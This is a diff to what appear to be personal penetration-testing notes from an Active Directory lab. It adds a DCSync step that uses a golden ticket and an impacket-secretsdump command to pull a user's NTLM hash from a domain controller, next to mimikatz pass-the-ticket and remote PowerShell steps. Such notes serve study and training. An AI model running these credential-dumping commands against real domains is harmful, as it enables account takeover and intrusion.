@@ -286,6 +286,17 @@ we need to synchronize the time of the Kali machine with the domain controller. 
    * First, perform PtT using mimikatz, then
    * Open a PowerShell console: `powershell`
    * Connect to the target machine: `Enter-PSSession -ComputerName DC01`
+7. PtT via DCsync command:&#x20;
+   * We first need to have a golden ticket first. (See [Attacking Domain Trusts - Child -> Parent Trusts - from Linux in Notion](https://www.notion.so/Attacking-Domain-Trusts-Child-Parent-Trusts-from-Linux-13a8c836dfa980ec8cb0c30e299deb42))
+   * Command below can get NTLM hash from domain controller with specified User.
+   * Syntax: child\_domain/user@domaincontroller -just-dc-user parentdomain/targeteduser
+   * {% code overflow="wrap" %}
+     ```
+     impacket-secretsdump logistics.inlanefreight.local/hacker@academy-ea-dc01.inlanefreight.local -just-dc-user INLANEFREIGHT/bross -k -no-pass -target-ip 172.16.5.5
+     ```
+     {% endcode %}
+
+
 
 ***
 
